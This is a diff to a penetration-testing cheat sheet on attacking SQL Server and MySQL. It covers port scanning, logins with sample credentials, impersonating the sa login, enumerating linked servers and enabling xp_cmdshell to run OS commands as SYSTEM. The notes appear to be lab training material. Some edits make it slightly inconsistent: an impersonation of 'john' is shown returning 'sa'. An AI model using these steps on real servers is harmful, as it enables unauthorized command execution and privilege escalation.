@@ -22,7 +22,7 @@ nmap -Pn -sV -sC -p1433,1434,2433,3306 10.10.10.125 # enum
 mysql -u julio -pPassword123 -h 10.129.20.13 
 
 #### connect to MSSQL  (mixed mode (use the sql server to auth))
-sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30 -C # connect to MSSQL 
+sqlcmd -S <server> -U julio -P 'MyPassword!' -y 30 -Y 30 -C # connect to MSSQL 
 sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h # conect to MSSQL
 impacket-mssqlclient -p 1433 julio@10.129.203.7
 
@@ -160,7 +160,8 @@ ON MYSQL :
 ----------------------------------------------
 ## Impersonate Existing Users with MSSQL
 # SQL Server has a special permission, named "IMPERSONATE", that allows the executing user to take on the permissions of another user or login  
-
+  # can lead to privilege escalation in SQL Server
+  
 0-# move to the master DB
 # It is recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database
   USE master
@@ -168,12 +169,13 @@ ON MYSQL :
 1-# Identify Users that We Can Impersonate
 [+] # Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned
 
-  1> SELECT distinct b.name
-  2> FROM sys.server_permissions a
-  3> INNER JOIN sys.server_principals b
-  4> ON a.grantor_principal_id = b.principal_id
-  5> WHERE a.permission_name = 'IMPERSONATE'
-  6> GO
+  SELECT distinct b.name
+  FROM sys.server_permissions a
+  INNER JOIN sys.server_principals b
+  ON a.grantor_principal_id = b.principal_id
+  WHERE a.permission_name = 'IMPERSONATE'
+  GO
+  
   name
   ---------
   sa
@@ -181,19 +183,20 @@ ON MYSQL :
   valentin
   
 2-# Verifying our Current User and Role
-  1> SELECT SYSTEM_USER
-  2> SELECT IS_SRVROLEMEMBER('sysadmin')
-  3> go
+  SELECT SYSTEM_USER
+  SELECT IS_SRVROLEMEMBER('sysadmin')
+  go
+  
   -----------
   julio                                                                            -----------
           0   #=> 0 indicates, we do not have the sysadmin role
 [+] # we dont have sysadmin role ,but we can impersnate "sa" user.
 
 3-# Impersonating the SA User
-  1> EXECUTE AS LOGIN = 'sa'
-  2> SELECT SYSTEM_USER
-  3> SELECT IS_SRVROLEMEMBER('sysadmin')
-  4> GO
+  EXECUTE AS LOGIN = 'john'
+  SELECT SYSTEM_USER
+  SELECT IS_SRVROLEMEMBER('sysadmin')
+  GO
   -----------
   sa
   -----------
@@ -209,21 +212,36 @@ ON MYSQL :
 # If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance.
 
   ### Identify linked Servers in MSSQL
-  1> SELECT srvname, isremote FROM sysservers
-  2> GO
+  SELECT srvname, isremote FROM sysservers
+  GO
 
   srvname                             isremote
   ----------------------------------- --------
-  DESKTOP-MFERMN4\SQLEXPRESS          1        # remote server
-  10.0.0.12\SQLEXPRESS                0        # linked server
+  DESKTOP-MFERMN4\SQLEXPRESS          1        # remote server (Not Useful)
+  10.0.0.12\SQLEXPRESS                0        # linked server (^-^)
 
   ### identify the user used for the connection and its privileges
-  1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
-  2> GO
+  EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+  GO
   --------------------------  ----------------------------------------  ------
   DESKTOP-0L9D4KA\SQLEXPRESS  Microsoft SQL Server 2019 (RTM sa_remote    1
-  
+
+# sysadmin = 1 we have authority\system priv
 #> now We can read data from any database or execute system commands with xp_cmdshell
+   # Note: Use double single quotes '' to escape ' inside SQL strings,
+
+  # enable xp_cmdshell first before excute:
+  EXECUTE (
+    'EXEC sp_configure ''show advanced options'', 1;
+     RECONFIGURE;
+     EXEC sp_configure ''xp_cmdshell'', 1;
+     RECONFIGURE;'
+) AT [LOCAL.TEST.LINKED.SRV ];
+  go
+  
+  # excute cmd if we have priv
+  EXECUTE ('xp_cmdshell ''whoami''') AT [10.0.0.12\SQLEXPRESS];
+  GO #=> nt authority\system  
 ```
 
 
